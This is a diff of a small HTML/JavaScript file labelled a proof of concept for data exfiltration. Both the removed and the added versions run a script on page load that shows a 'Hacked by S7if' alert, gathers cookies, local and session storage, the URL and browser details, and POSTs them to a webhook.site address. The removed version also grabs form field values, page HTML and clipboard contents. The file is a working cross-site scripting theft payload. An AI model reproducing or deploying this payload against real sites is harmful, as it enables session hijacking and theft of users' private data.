@@ -1,59 +1,21 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>PoC Data Exfiltration</title>
-</head>
-<body>
-  <h1>Please wait...</h1>
+<script>
+(async () => {
+  alert("💀 Hacked by S7if 💀");
+  const data = {
+    cookies: document.cookie,
+    localStorage: {...localStorage},
+    sessionStorage: {...sessionStorage},
+    url: location.href,
+    referrer: document.referrer,
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    time: new Date().toISOString()
+  };
+  await fetch("https://webhook.site/3dd75195-9a2f-4eb2-90e4-a036f13bdd9b", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(data)
+  });
+})();
+</script>
 
-  <script>
-    (async () => {
-      alert("💀 Hacked by S7if 💀");
-
-      // جمع البيانات
-      let data = {
-        cookies: document.cookie,
-        localStorage: {...localStorage},
-        sessionStorage: {...sessionStorage},
-        clipboard: "No permission or empty",
-        forms: Array.from(document.forms).map(form => ({
-          action: form.action,
-          method: form.method,
-          fields: Array.from(form.elements).map(el => ({
-            name: el.name,
-            type: el.type,
-            value: el.value
-          }))
-        })),
-        htmlSnippet: document.documentElement.outerHTML.slice(0, 5000),
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        url: location.href,
-        time: new Date().toISOString()
-      };
-
-      // محاولة قراءة clipboard لو في صلاحيات
-      try {
-        const clipText = await navigator.clipboard.readText();
-        if (clipText) data.clipboard = clipText;
-      } catch (e) {
-        // تجاهل الخطأ لو مفيش صلاحية
-      }
-
-      // إرسال البيانات لل webhook
-      try {
-        await fetch("https://webhook.site/3dd75195-9a2f-4eb2-90e4-a036f13bdd9b", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
-        });
-      } catch(e) {
-        // تجاهل الخطأ لو حصل
-      }
-
-      // تغيير النص في الصفحة بعد السرقة
-      document.body.innerHTML = "<h2>Data exfiltrated successfully.</h2><p>Stay safe!</p>";
-    })();
-  </script>
-</body>
-</html>
